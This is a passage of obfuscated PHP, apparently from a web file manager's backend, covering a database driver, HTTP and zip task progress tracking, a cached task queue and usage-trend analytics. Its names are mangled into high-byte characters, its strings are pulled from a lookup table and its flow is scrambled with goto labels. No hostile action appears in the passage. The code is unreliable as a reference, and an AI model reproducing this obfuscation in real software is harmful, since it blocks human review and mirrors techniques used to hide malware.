=> (bool) ($…³Ë¥Ô³[$€ÕÑğê[35]] === $€ÕÑğê[12]), $€ÕÑğê[37] => $…³Ë¥Ô³[$€ÕÑğê[56]], $€ÕÑğê[39] => (bool) $…³Ë¥Ô³[$€ÕÑğê[57]], $€ÕÑğê[42] => (bool) $…³Ë¥Ô³[$€ÕÑğê[57]]); } } return $ÅŞËÌ; } public function getTables($ÇÜ€¢³Ú = '') { $ş…ˆçÊŠ =& $_SERVER[ê‘³Æ±]; $“ ¬ŒŸô = $this->query($ş…ˆçÊŠ[45] . $ş…ˆçÊŠ[46] . $ş…ˆçÊŠ[47]); $˜¬½Œä› = array(); foreach ($“ ¬ŒŸô as $¹¿’¨®¿ => $Âê¥Œ‹Ó) { $˜¬½Œä›[$¹¿’¨®¿] = current($Âê¥Œ‹Ó); } return $˜¬½Œä›; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $½—Ú‡Ö… =& $_SERVER[ê‘³Æ±]; $this->error = $this->_linkID->lastErrorMsg(); if ($½—Ú‡Ö…[12] != $this->queryStr) { $this->error .= LNG($½—Ú‡Ö…[48]) . $this->queryStr; } think_trace($this->error, $½—Ú‡Ö…[12], $½—Ú‡Ö…[49]); return $this->error; } public function escapeString($„Ô’­Öı) { $„—Ÿ°Ü =& $_SERVER[ê‘³Æ±]; if ($this->_linkID) { return $this->_linkID->escapeString($„Ô’­Öı); } return str_ireplace($„—Ÿ°Ü[58], $„—Ÿ°Ü[59], $„Ô’­Öı); } public function parseLimit($•É‰˜–¢) { $¶ÁÀÏˆ =& $_SERVER[ê‘³Æ±]; $©Áä“ÏĞ = $¶ÁÀÏˆ[12]; if (!empty($•É‰˜–¢)) { $•É‰˜–¢ = explode($¶ÁÀÏˆ[50], $•É‰˜–¢); if (count($•É‰˜–¢) > 1) { $©Áä“ÏĞ .= $¶ÁÀÏˆ[51] . $•É‰˜–¢[1] . $¶ÁÀÏˆ[52] . $•É‰˜–¢[0] . $¶ÁÀÏˆ[53]; } else { $©Áä“ÏĞ .= $¶ÁÀÏˆ[51] . $•É‰˜–¢[0] . $¶ÁÀÏˆ[53]; } } return $©Áä“ÏĞ; } } goto Dš¶Õˆ®•; FÛ‰ÇÍïÃ­: class TaskHttp extends Task { protected function startAfter() { $Ø‰˜—Ğ³ =& $_SERVER[ê‘³Æ±]; $…¯Ö£Óµ =& $this->task; $…¯Ö£Óµ[$Ø‰˜—Ğ³[1712]] = 1; Hook::bind($Ø‰˜—Ğ³[1681], array($this, $Ø‰˜—Ğ³[1713])); Hook::bind($Ø‰˜—Ğ³[1683], array($this, $Ø‰˜—Ğ³[1714])); Hook::bind($Ø‰˜—Ğ³[1685], array($this, $Ø‰˜—Ğ³[1715])); } protected function endAfter() { $÷Û÷Ì“Å =& $_SERVER[ê‘³Æ±]; Hook::unbind($÷Û÷Ì“Å[1681], array($this, $÷Û÷Ì“Å[1713])); Hook::unbind($÷Û÷Ì“Å[1683], array($this, $÷Û÷Ì“Å[1714])); Hook::unbind($÷Û÷Ì“Å[1685], array($this, $÷Û÷Ì“Å[1715])); } public function progressStart($ôş€óÇÒ) { $ÉÙ€œÉ =& $_SERVER[ê‘³Æ±]; $ˆşÂµÇõ = curl_getinfo($ôş€óÇÒ); self::log($ÉÙ€œÉ[1716] . $ˆşÂµÇõ[$ÉÙ€œÉ[304]]); self::valueSet($this->task[$ÉÙ€œÉ[394]], $this->task); } public function progressEnd($ªë¤–”) { $ÅÅ¹ãô =& $_SERVER[ê‘³Æ±]; self::log($ÅÅ¹ãô[1717] . $this->task[$ÅÅ¹ãô[394]]); $this->end(); } public function progress($•ÈÉÖã , $Á¥»¹, $ô…óòû›, $Ö¼™¡Œ©, $Š¤®ãî») { $øæäö± =& $_SERVER[ê‘³Æ±]; $ï‘ÌÑœ¦ =& $this->task; if ($Š¤®ãî» > 0) { $ï‘ÌÑœ¦[$øæäö±[772]] = $ï‘ÌÑœ¦[$øæäö±[772]] == 0 ? $Ö¼™¡Œ© : $ï‘ÌÑœ¦[$øæäö±[772]]; $ï‘ÌÑœ¦[$øæäö±[1642]] = $Š¤®ãî»; } else { if ($ô…óòû› > 0) { $ï‘ÌÑœ¦[$øæäö±[772]] = $ï‘ÌÑœ¦[$øæäö±[772]] == 0 ? $Á¥»¹ : $ï‘ÌÑœ¦[$øæäö±[772]]; $ï‘ÌÑœ¦[$øæäö±[1642]] = $ô…óòû›; } } $this->update(); self::log("\160\x72\x6f\147\x72\145\163\x73\110\x74\x74\x70\72\x64\157\x77\x6e\72{$ô…óòû›}\57{$Á¥»¹}\x3b\x20\x75\x70\x6c\x6f\x61\x64\72{$Š¤®ãî»}\57{$Ö¼™¡Œ©}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\121\165\145\165\145\x4c\145\156\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\121\x75\145\165\145\104\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($’·şê£¹, $ÄŸƒ€£ = array(), $á¾ãù¶¾ = '', $÷¹ÆÅû• = '') { $½ó“å´© =& $_SERVER[ê‘³Æ±]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($÷¹ÆÅû• && array_find_by_field(self::$listData, $½ó“å´©[95], $÷¹ÆÅû•)) { return !0; } self::$listData[] = array($½ó“å´©[261] => $’·şê£¹, $½ó“å´©[1718] => $ÄŸƒ€£, $½ó“å´©[444] => $á¾ãù¶¾, $½ó“å´©[95] => $÷¹ÆÅû•); return !0; } public static function addSubmit() { $çÄƒõø =& $_SERVER[ê‘³Æ±]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($çÄƒõø[1719] . json_encode_force(array_to_keyvalue(self::$listData, $çÄƒõø[12], $çÄƒõø[444])), $çÄƒõø[1720]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($íˆê³‹¨, $µ¥Ì²Æ = array(), $÷¹ôëÁ = '', $¤Ê†åÒÙ = '') { $ĞöÁªıµ =& $_SERVER[ê‘³Æ±]; if (self::count() >= self::MAX_LENGTH) { return !1; } $©ÉŒ¯ˆ = self::getAll(); if ($¤Ê†åÒÙ && array_find_by_field($©ÉŒ¯ˆ, $ĞöÁªıµ[95], $¤Ê†åÒÙ)) { return !0; } $©ÉŒ¯ˆ[] = array($ĞöÁªıµ[261] => $íˆê³‹¨, $ĞöÁªıµ[1718] => $µ¥Ì²Æ, $ĞöÁªıµ[444] => $÷¹ôëÁ, $ĞöÁªıµ[95] => $¤Ê†åÒÙ); write_log($ĞöÁªıµ[1719] . $÷¹ôëÁ, $ĞöÁªıµ[1720]); self::setAll($©ÉŒ¯ˆ); return !0; } public static function run() { $³¯ªØ¦À =& $_SERVER[ê‘³Æ±]; $¤ÕÔ·‡‹ = self::getAll(); $Šüº¶°ì = array_shift($¤ÕÔ·‡‹); if (!$Šüº¶°ì) { return !1; } self::setAll($¤ÕÔ·‡‹); $ŒÑÔ•¶ = timeFloat(); try { Hook::apply($Šüº¶°ì[$³¯ªØ¦À[261]], $Šüº¶°ì[$³¯ªØ¦À[1718]]); } catch (Exception $á·’Ë ) { } $Ó§íá‘ = number_format(timeFloat() - $ŒÑÔ•¶, 3) . $³¯ªØ¦À[1657]; write_log($³¯ªØ¦À[1721] . $Šüº¶°ì[$³¯ªØ¦À[444]] . $³¯ªØ¦À[1722] . $Ó§íá‘, $³¯ªØ¦À[1720]); return !0; } public static function count() { $í†Ä„Ÿï = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$í†Ä„Ÿï) { return 0; } return intval($í†Ä„Ÿï); } public static function getAll() { $«÷”€õ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$«÷”€õ) { return array(); } return $«÷”€õ; } public static function setAll($äø¿ãê) { $óöİ£¬Õ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($äø¿ãê), $óöİ£¬Õ); Cache::set(self::QUEUE_DATA, $äø¿ãê, $óöİ£¬Õ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ùÇ¼õŠ¶, $ó¯È¤í¿ = 5.0) { if (!$ùÇ¼õŠ¶) { return; } $÷¾è­„é = Cache::get($ùÇ¼õŠ¶); if (!$÷¾è­„é || timeFloat() - floatVal($÷¾è­„é) >= $ó¯È¤í¿) { Cache::set($ùÇ¼õŠ¶, timeFloat(), $ó¯È¤í¿ * 10); return !0; } return !1; } public static function timeLimitCall($Ğ«¢Ğ¢¢, $‘‡àô·ê, $û’‡ù¾ˆ, $æ¤µåš = 5.0) { $¨êğ¸Ùƒ =& $_SERVER[ê‘³Æ±]; if (!$Ğ«¢Ğ¢¢ || !$‘‡àô·ê) { return; } self::$asyncAdd = !0; $ïªÃ‹ÌÂ = $¨êğ¸Ùƒ[1723]; $˜¨ÉáØÁ = Cache::get($ïªÃ‹ÌÂ, !0); $ÑßíÀõ = array($¨êğ¸Ùƒ[1724] => timeFloat(), $¨êğ¸Ùƒ[1725] => timeFloat(), $¨êğ¸Ùƒ[261] => $‘‡àô·ê, $¨êğ¸Ùƒ[1718] => $û’‡ù¾ˆ, $¨êğ¸Ùƒ[198] => $æ¤µåš); if (is_array($˜¨ÉáØÁ[$Ğ«¢Ğ¢¢])) { $ÑßíÀõ[$¨êğ¸Ùƒ[1725]] = $˜¨ÉáØÁ[$Ğ«¢Ğ¢¢][$¨êğ¸Ùƒ[1725]]; } if (is_array($˜¨ÉáØÁ[$Ğ«¢Ğ¢¢])) { if (timeFloat() - $˜¨ÉáØÁ[$Ğ«¢Ğ¢¢][$¨êğ¸Ùƒ[1724]] < $ÑßíÀõ[$¨êğ¸Ùƒ[198]] * 0.3) { return; } $ÑßíÀõ[$¨êğ¸Ùƒ[1725]] = $˜¨ÉáØÁ[$Ğ«¢Ğ¢¢][$¨êğ¸Ùƒ[1725]]; } $˜¨ÉáØÁ[$Ğ«¢Ğ¢¢] = $ÑßíÀõ; Cache::set($ïªÃ‹ÌÂ, $˜¨ÉáØÁ, 60); Cache::removeMemory($ïªÃ‹ÌÂ); write_log($¨êğ¸Ùƒ[1726] . $Ğ«¢Ğ¢¢ . $¨êğ¸Ùƒ[71] . $‘‡àô·ê, $¨êğ¸Ùƒ[1720]); } public static function timeLimitCallLoop() { $Óöı¯Ã³ =& $_SERVER[ê‘³Æ±]; $Ñî³¹¾À = array($Óöı¯Ã³[1727]); $‚—Øúóì = in_array(strtolower(ACTION), $Ñî³¹¾À); if (!$‚—Øúóì && !self::$asyncAdd) { return; } $ÎŒç‘úğ = $Óöı¯Ã³[1723]; $ Î¨¯Åã = Cache::get($ÎŒç‘úğ, !0); if (!$ Î¨¯Åã || count($ Î¨¯Åã) <= 0) { return; } $”ú³şÆ‚ = !1; $´‹¥“ûÑ = timeFloat(); $ÖÓí»‡ª = array(); foreach ($ Î¨¯Åã as $¿äÇ• => $İÅ÷”Ø) { if ($´‹¥“ûÑ - $İÅ÷”Ø[$Óöı¯Ã³[1725]] > $İÅ÷”Ø[$Óöı¯Ã³[198]]) { $”ú³şÆ‚ = !0; try { Hook::apply($İÅ÷”Ø[$Óöı¯Ã³[261]], $İÅ÷”Ø[$Óöı¯Ã³[1718]]); write_log($Óöı¯Ã³[1728] . $¿äÇ• . $Óöı¯Ã³[71] . $İÅ÷”Ø[$Óöı¯Ã³[261]] . $Óöı¯Ã³[1729] . ACTION, $Óöı¯Ã³[1720]); } catch (Exception $·ú‹©æ) { } continue; } $ÖÓí»‡ª[$¿äÇ•] = $İÅ÷”Ø; } if (!$”ú³şÆ‚) { return; } if (!$ÖÓí»‡ª) { return Cache::remove($ÎŒç‘úğ); } Cache::set($ÎŒç‘úğ, $ÖÓí»‡ª, 60); Cache::removeMemory($ÎŒç‘úğ); } public static function finished($Û·ë®£È, $€ã‘¶¿) { $ıñê„Ç¸ =& $_SERVER[ê‘³Æ±]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ıñê„Ç¸[261] => $Û·ë®£È, $ıñê„Ç¸[1718] => $€ã‘¶¿); } private static function finishedRun() { $æşÇ¿¾ş =& $_SERVER[ê‘³Æ±]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $°Åö§Á’) { try { Hook::apply($°Åö§Á’[$æşÇ¿¾ş[261]], $°Åö§Á’[$æşÇ¿¾ş[1718]]); } catch (Exception $ûÃ²âàÇ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto cëÜ¶„×Í; cëÜ¶„×Í: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $™¥› ”º =& $_SERVER[ê‘³Æ±]; parent::startAfter(); Hook::bind($™¥› ”º[1730], array($this, $™¥› ”º[1731])); Hook::bind($™¥› ”º[1181], array($this, $™¥› ”º[1732])); $Ÿö™Å £ =& $this->task; $Ÿö™Å £[$™¥› ”º[1733]] = $™¥› ”º[1186]; if (!$Ÿö™Å £[$™¥› ”º[1541]]) { $Ÿö™Å £[$™¥› ”º[1541]] = LNG($™¥› ”º[1734]); } } protected function endAfter() { $Š±µÑÖæ =& $_SERVER[ê‘³Æ±]; parent::endAfter(); Hook::unbind($Š±µÑÖæ[1730], array($this, $Š±µÑÖæ[1731])); Hook::unbind($Š±µÑÖæ[1181], array($this, $Š±µÑÖæ[1732])); } public function updateAfter() { $÷§€À°´ =& $_SERVER[ê‘³Æ±]; $›Á£×—¯ =& $this->task; if (!$›Á£×—¯[$÷§€À°´[772]] || !$›Á£×—¯[$÷§€À°´[749]]) { return; } if ($›Á£×—¯[$÷§€À°´[1733]] == $÷§€À°´[1186]) { $Ÿƒî”„æ = 0; if ($›Á£×—¯[$÷§€À°´[1689]]) { $Ÿƒî”„æ = $›Á£×—¯[$÷§€À°´[1690]] / $›Á£×—¯[$÷§€À°´[1689]]; } $›Á£×—¯[$÷§€À°´[1643]] = $Ÿƒî”„æ * 0.3; } else { if ($›Á£×—¯[$÷§€À°´[1733]] == $÷§€À°´[310]) { $Ÿƒî”„æ = $›Á£×—¯[$÷§€À°´[1642]] / $›Á£×—¯[$÷§€À°´[772]]; $›Á£×—¯[$÷§€À°´[1643]] = 0.3 + $Ÿƒî”„æ * 0.4; } else { if ($›Á£×—¯[$÷§€À°´[1733]] == $÷§€À°´[108]) { $À—ÑŸ’Ÿ = 0; if ($›Á£×—¯[$÷§€À°´[1691]] == $÷§€À°´[108]) { $À—ÑŸ’Ÿ = $›Á£×—¯[$÷§€À°´[1690]]; } $Ÿƒî”„æ = ($›Á£×—¯[$÷§€À°´[1694]] + $À—ÑŸ’Ÿ) / $›Á£×—¯[$÷§€À°´[749]]; $›Á£×—¯[$÷§€À°´[1643]] = 0.3 + 0.4 + $Ÿƒî”„æ * 0.3; } } } if ($›Á£×—¯[$÷§€À°´[1643]] > 0) { $Ø¹€ˆÉ– = timeFloat() - $›Á£×—¯[$÷§€À°´[1645]] - $›Á£×—¯[$÷§€À°´[1648]]; $›Á£×—¯[$÷§€À°´[1649]] = $Ø¹€ˆÉ– * (1 - $›Á£×—¯[$÷§€À°´[1643]]) / $›Á£×—¯[$÷§€À°´[1643]]; } } public function addFile($­©²Ö º) { $ûÕ‡İ–ş =& $_SERVER[ê‘³Æ±]; $‡ÓüËÎŠ =& $this->task; $¢çÅ§Ö¼ = IO::info($­©²Ö º); $‡ÓüËÎŠ[$ûÕ‡İ–ş[1687]] = $¢çÅ§Ö¼[$ûÕ‡İ–ş[32]]; $‡ÓüËÎŠ[$ûÕ‡İ–ş[1689]] = $¢çÅ§Ö¼[$ûÕ‡İ–ş[80]]; $‡ÓüËÎŠ[$ûÕ‡İ–ş[1690]] = 0; $‡ÓüËÎŠ[$ûÕ‡İ–ş[1053]] = $ûÕ‡İ–ş[1709]; $‡ÓüËÎŠ[$ûÕ‡İ–ş[1691]] = $ûÕ‡İ–ş[1186]; $‡ÓüËÎŠ[$ûÕ‡İ–ş[749]] = $¢çÅ§Ö¼[$ûÕ‡İ–ş[80]]; $‡ÓüËÎŠ[$ûÕ‡İ–ş[772]] = 1; $‘úæ×•ã = 0; $‡ÓüËÎŠ[$ûÕ‡İ–ş[1698]] = array($ûÕ‡İ–ş[1699] => $‘úæ×•ã + 1, $ûÕ‡İ–ş[414] => $¢çÅ§Ö¼[$ûÕ‡İ–ş[32]], $ûÕ‡İ–ş[78] => $¢çÅ§Ö¼[$ûÕ‡İ–ş[78]], $ûÕ‡İ–ş[512] => $¢çÅ§Ö¼[$ûÕ‡İ–ş[512]] ? $¢çÅ§Ö¼[$ûÕ‡İ–ş[512]] : $¢çÅ§Ö¼[$ûÕ‡İ–ş[78]]); $this->update(); } public function unzipAfter($å±Ï…·‚) { $¸‹º‡Í =& $_SERVER[ê‘³Æ±]; $Ú´¿Õ´’ =& $this->task; $Ú´¿Õ´’[$¸‹º‡Í[1733]] = $¸‹º‡Í[108]; $œì·­´ = IO::infoWithChildren($å±Ï…·‚); $äó‘˜× = 0; $Ú´¿Õ´’[$¸‹º‡Í[1698]] = array($¸‹º‡Í[1699] => $äó‘˜× + 1, $¸‹º‡Í[414] => $œì·­´[$¸‹º‡Í[32]], $¸‹º‡Í[78] => $œì·­´[$¸‹º‡Í[78]], $¸‹º‡Í[512] => $œì·­´[$¸‹º‡Í[512]] ? $œì·­´[$¸‹º‡Í[512]] : $œì·­´[$¸‹º‡Í[78]]); if ($œì·­´[$¸‹º‡Í[33]] == $¸‹º‡Í[194]) { $Ú´¿Õ´’[$¸‹º‡Í[772]] = 1; } else { $Ú´¿Õ´’[$¸‹º‡Í[772]] = $œì·­´[$¸‹º‡Í[83]][$¸‹º‡Í[81]]; } $Ú´¿Õ´’[$¸‹º‡Í[1053]] = $¸‹º‡Í[12]; $Ú´¿Õ´’[$¸‹º‡Í[1691]] = 0; $Ú´¿Õ´’[$¸‹º‡Í[1642]] = 0; $Ú´¿Õ´’[$¸‹º‡Í[1689]] = 0; $Ú´¿Õ´’[$¸‹º‡Í[1690]] = 0; $Ú´¿Õ´’[$¸‹º‡Í[1687]] = $¸‹º‡Í[12]; $Ú´¿Õ´’[$¸‹º‡Í[1694]] = 0; $Ú´¿Õ´’[$¸‹º‡Í[749]] = $œì·­´[$¸‹º‡Í[80]]; $this->update(); self::log($¸‹º‡Í[1735] . json_encode(array($Ú´¿Õ´’, $œì·­´))); } public function nameParse($¯ñÇã÷) { $¬ÕòŞ¥§ =& $_SERVER[ê‘³Æ±]; $ôş„Éå‹ =& $this->task; if ($ôş„Éå‹[$¬ÕòŞ¥§[1733]] == $¬ÕòŞ¥§[1186]) { $ôş„Éå‹[$¬ÕòŞ¥§[1733]] = $¬ÕòŞ¥§[310]; $ôş„Éå‹[$¬ÕòŞ¥§[1694]] = 0; $ôş„Éå‹[$¬ÕòŞ¥§[749]] = 0; } $òğÒÏÉ = get_path_this($¯ñÇã÷); if (strstr($òğÒÏÉ, $¬ÕòŞ¥§[10])) { $ôş„Éå‹[$¬ÕòŞ¥§[1642]] += 1; $ôş„Éå‹[$¬ÕòŞ¥§[772]] += 1; } $ôş„Éå‹[$¬ÕòŞ¥§[1687]] = $¯ñÇã÷; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $±ìØÀƒö =& $_SERVER[ê‘³Æ±]; parent::startAfter(); Hook::bind($±ìØÀƒö[1736], array($this, $±ìØÀƒö[1731])); $²åŸ²æ“ =& $this->task; $²åŸ²æ“[$±ìØÀƒö[1733]] = $±ìØÀƒö[1186]; if (!$²åŸ²æ“[$±ìØÀƒö[1541]]) { $²åŸ²æ“[$±ìØÀƒö[1541]] = LNG($±ìØÀƒö[1737]); } } protected function endAfter() { $ÛÊ·¨Ì¨ =& $_SERVER[ê‘³Æ±]; parent::endAfter(); Hook::unbind($ÛÊ·¨Ì¨[1736], array($this, $ÛÊ·¨Ì¨[1731])); } public function updateAfter() { $æü†ƒ–Ğ =& $_SERVER[ê‘³Æ±]; $¢Õëäãî =& $this->task; if (!$¢Õëäãî[$æü†ƒ–Ğ[772]] || !$¢Õëäãî[$æü†ƒ–Ğ[749]]) { return; } if ($¢Õëäãî[$æü†ƒ–Ğ[1733]] == $æü†ƒ–Ğ[1186]) { $®ñİÅê³ = $¢Õëäãî[$æü†ƒ–Ğ[1690]]; if ($¢Õëäãî[$æü†ƒ–Ğ[1691]] != $æü†ƒ–Ğ[1186]) { $®ñİÅê³ = 0; } $´ºÈÂ€ = ($¢Õëäãî[$æü†ƒ–Ğ[1694]] + $®ñİÅê³) / $¢Õëäãî[$æü†ƒ–Ğ[749]]; $¢Õëäãî[$æü†ƒ–Ğ[1643]] = $´ºÈÂ€ * 0.3; } else { if ($¢Õëäãî[$æü†ƒ–Ğ[1733]] == $æü†ƒ–Ğ[310]) { $´ºÈÂ€ = $¢Õëäãî[$æü†ƒ–Ğ[1642]] / $¢Õëäãî[$æü†ƒ–Ğ[772]]; $¢Õëäãî[$æü†ƒ–Ğ[1643]] = 0.3 + $´ºÈÂ€ * 0.5; } else { if ($¢Õëäãî[$æü†ƒ–Ğ[1733]] == $æü†ƒ–Ğ[108]) { $´ºÈÂ€ = 0; if ($¢Õëäãî[$æü†ƒ–Ğ[1689]]) { $´ºÈÂ€ = $¢Õëäãî[$æü†ƒ–Ğ[1690]] / $¢Õëäãî[$æü†ƒ–Ğ[1689]]; } $¢Õëäãî[$æü†ƒ–Ğ[1643]] = 0.3 + 0.5 + $´ºÈÂ€ * 0.2; } } } if ($¢Õëäãî[$æü†ƒ–Ğ[1643]] > 0) { $çÅ‚õŒ = timeFloat() - $¢Õëäãî[$æü†ƒ–Ğ[1645]] - $¢Õëäãî[$æü†ƒ–Ğ[1648]]; $¢Õëäãî[$æü†ƒ–Ğ[1649]] = $çÅ‚õŒ * (1 - $¢Õëäãî[$æü†ƒ–Ğ[1643]]) / $¢Õëäãî[$æü†ƒ–Ğ[1643]]; } } public function copyFileStart($£¦ƒóãè, $ğéĞùı°, $Å¿ûâ£ˆ, $§ÄÎ”ö¢, $ãêã‹‹û, $Ûøƒ“¡) { $Ñ®ñô¡õ =& $_SERVER[ê‘³Æ±]; parent::copyFileStart($£¦ƒóãè, $ğéĞùı°, $Å¿ûâ£ˆ, $§ÄÎ”ö¢, $ãêã‹‹û, $Ûøƒ“¡); $¦µº°óü =& $this->task; if ($¦µº°óü[$Ñ®ñô¡õ[1733]] == $Ñ®ñô¡õ[310]) { $¦µº°óü[$Ñ®ñô¡õ[1733]] = $Ñ®ñô¡õ[108]; } $this->update(); } public function copyFileEnd($öªÁ¶ªš, $¾ù§èê, $¬¶ÇšÎñ, $»ñóèşÜ, $Í‰¶€–š, $¢®ë½‡á) { $‰œû‘Ì =& $_SERVER[ê‘³Æ±]; $é¾¥¿Ï =& $this->task; $é¾¥¿Ï[$‰œû‘Ì[1690]] = $é¾¥¿Ï[$‰œû‘Ì[1689]]; $é¾¥¿Ï[$‰œû‘Ì[1694]] += $é¾¥¿Ï[$‰œû‘Ì[1689]]; $é¾¥¿Ï[$‰œû‘Ì[1691]] = $‰œû‘Ì[12]; $this->update(); } public function nameParse($¾å§€‚Ú) { $úğ˜óº =& $_SERVER[ê‘³Æ±]; $ÂÒ£§´´ =& $this->task; if ($ÂÒ£§´´[$úğ˜óº[1642]] < $ÂÒ£§´´[$úğ˜óº[772]]) { $³®¬çÉ = get_path_this($¾å§€‚Ú); if (strstr($³®¬çÉ, $úğ˜óº[10])) { $ÂÒ£§´´[$úğ˜óº[1642]] += 1; } } if ($ÂÒ£§´´[$úğ˜óº[1733]] == $úğ˜óº[1186]) { $ÂÒ£§´´[$úğ˜óº[1733]] = $úğ˜óº[310]; } $ÂÒ£§´´[$úğ˜óº[1687]] = $¾å§€‚Ú; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($·½Ë¯Íú) { $—¾ ™² =& $_SERVER[ê‘³Æ±]; $«¤¼Ğ…¶ = array($—¾ ™²[590] => array($—¾ ™²[33] => $—¾ ™²[1738], $—¾ ™²[270] => array($—¾ ™²[221], $—¾ ™²[751], $—¾ ™²[1739], $—¾ ™²[1740])), $—¾ ™²[1741] => array($—¾ ™²[33] => $—¾ ™²[1742], $—¾ ™²[270] => array($—¾ ™²[221], $—¾ ™²[749], $—¾ ™²[1743], $—¾ ™²[1744], $—¾ ™²[1745]))); if (!isset($«¤¼Ğ…¶[$·½Ë¯Íú])) { return !1; } $this->optionType = $«¤¼Ğ…¶[$·½Ë¯Íú][$—¾ ™²[33]]; $this->field = $«¤¼Ğ…¶[$·½Ë¯Íú][$—¾ ™²[270]]; return !0; } public function listData($Í¡“‘‰ = false, $¬Âš§ â = "\x6d\x6f\144\x69\146\171\124\x69\x6d\145", $š–ªĞì¼ = false) { return parent::listData($Í¡“‘‰, $¬Âš§ â, $š–ªĞì¼); } public function trendList($òÛÍ¿ÛÌ) { $šöÂ¨ğ³ =& $_SERVER[ê‘³Æ±]; $Ğ…“äÂŸ = $this->listData(); if ($Ğ…“äÂŸ) { $€™ƒııî = end($Ğ…“äÂŸ); $¦ß”£¤´ = date($šöÂ¨ğ³[1746], strtotime($šöÂ¨ğ³[1747])); if ($€™ƒııî[$šöÂ¨ğ³[221]] == $¦ß”£¤´) { return $Ğ…“äÂŸ; } $é”Í™ûÉ = strtotime($€™ƒııî[$šöÂ¨ğ³[221]]); } if (!isset($é”Í™ûÉ)) { $½²ƒ£à = $òÛÍ¿ÛÌ == $šöÂ¨ğ³[590] ? $šöÂ¨ğ³[534] : $šöÂ¨ğ³[819]; $é”Í™ûÉ = Model($½²ƒ£à)->min($šöÂ¨ğ³[195]); } $Ô½Ë “— = $šöÂ¨ğ³[1748] . ucfirst($òÛÍ¿ÛÌ); $÷òŠÎôô = $this->dateList($é”Í™ûÉ); foreach ($÷òŠÎôô as $¦ß”£¤´) { $this->{$Ô½Ë “—}($¦ß”£¤´); } return $this->listData(); } private function dateList($ŸàÖ¹÷) { $ÈÖ§§¾œ =& $_SERVER[ê‘³Æ±]; $×èÕâ‰¸ = $ŸàÖ¹÷; $ˆÖ³ª¢ = strtotime($ÈÖ§§¾œ[1747]); $–ß§Äğ = array(); while ($×èÕâ‰¸ <= $ˆÖ³ª¢) { $–ß§Äğ[] = date($ÈÖ§§¾œ[1746], $×èÕâ‰¸); $×èÕâ‰¸ = strtotime($ÈÖ§§¾œ[1749], $×èÕâ‰¸); } return $–ß§Äğ; } public function _recordUser($±›èøñ· = '') { $ê¡î½»• =& $_SERVER[ê‘³Æ±]; $õ…—İ² = strtotime(date($ê¡î½»•[1750], strtotime($±›èøñ·))); $ÚÒ£Êº† = strtotime(date($ê¡î½»•[1751], strtotime($±›èøñ·))); $¡¦œ¿ˆ– = array($ê¡î½»•[195] => array($ê¡î½»•[1002], $ÚÒ£Êº†)); $éÆÀ‘ÀÊ = Model($ê¡î½»•[534])->where($¡¦œ¿ˆ–)->count($ê¡î½»•[1641]); $¡¦œ¿ˆ–[$ê¡î½»•[195]] = array($ê¡î½»•[330], array($õ…—İ², $ÚÒ£Êº†)); $º¹³Ó® = Model($ê¡î½»•[534])->where($¡¦œ¿ˆ–)->count($ê¡î½»•[1641]); $¡¦œ¿ˆ–[$ê¡î½»•[33]] = $ê¡î½»•[1752]; $È¼îï Ô = Model($ê¡î½»•[1753])->where($¡¦œ¿ˆ–)->count($ê¡î½»•[1754]); $‹±€ªò = array($ê¡î½»•[221] => $±›èøñ·, $ê¡î½»•[751] => (int) $éÆÀ‘ÀÊ, $ê¡î½»•[1739] => (int) $º¹³Ó®, $ê¡î½»•[1740] => (int) $È¼îï Ô); return $this->insert($‹±€ªò); } public function _recordStore($ÓÅóè¹Ô = '') { $ò’ÂÎ¹È =& $_SERVER[ê‘³Æ±]; $Úˆ‚ãí = strtotime(date($ò’ÂÎ¹È[1751], strtotime($ÓÅóè¹Ô))); $Ê¾ÙÔßÊ = array($ò’ÂÎ¹È[195] => array($ò’ÂÎ¹È[1002], $Úˆ‚ãí)); $”³ÍˆÛÉ = Model($ò’ÂÎ¹È[463])->where($Ê¾ÙÔßÊ)->sum($ò’ÂÎ¹È[80]); $Ê¾ÙÔßÊ[$ò’ÂÎ¹È[404]] = 0; $ÕŸ÷ˆİ = Model($ò’ÂÎ¹È[819])->where($Ê¾ÙÔßÊ)->sum($ò’ÂÎ¹È[80]); $Ê¾ÙÔßÊ[$ò’ÂÎ¹È[405]] = 1; $‚íº›Êø = Model($ò’ÂÎ¹È[819])->where($Ê¾ÙÔßÊ)->sum($ò’ÂÎ¹È[80]); $Ê¾ÙÔßÊ[$ò’ÂÎ¹È[405]] = 2; $™û¬­Ø = Model($ò’ÂÎ¹È[819])->where($Ê¾ÙÔßÊ)->sum($ò’ÂÎ¹È[80]); $‡™¬Êì = array($ò’ÂÎ¹È[221] => $ÓÅóè¹Ô, $ò’ÂÎ¹È[749] => (int) $ÕŸ÷ˆİ, $ò’ÂÎ¹È[1743] => (int) $”³ÍˆÛÉ, $ò’ÂÎ¹È[1744] => (int) $‚íº›Êø, $ò’ÂÎ¹È[1745] => (int) $™û¬­Ø); return $this->insert($‡™¬Êì); } public function trend($Ä©Ù„Šë, $ß‡şâ–ı) { $Ç×ŠÜğ¨ =& $_SERVER[ê‘³Æ±]; if (!$this->init($Ä©Ù„Šë)) { return !1; } $‡ ÛÌ× = $this->trendList($Ä©Ù„Šë); if ($‡ ÛÌ× && $ß‡şâ–ı != $Ç×ŠÜğ¨[1614]) { $Ò“¦Óå‰ = $‡ ÛÌ×[0][$Ç×ŠÜğ¨[221]]; 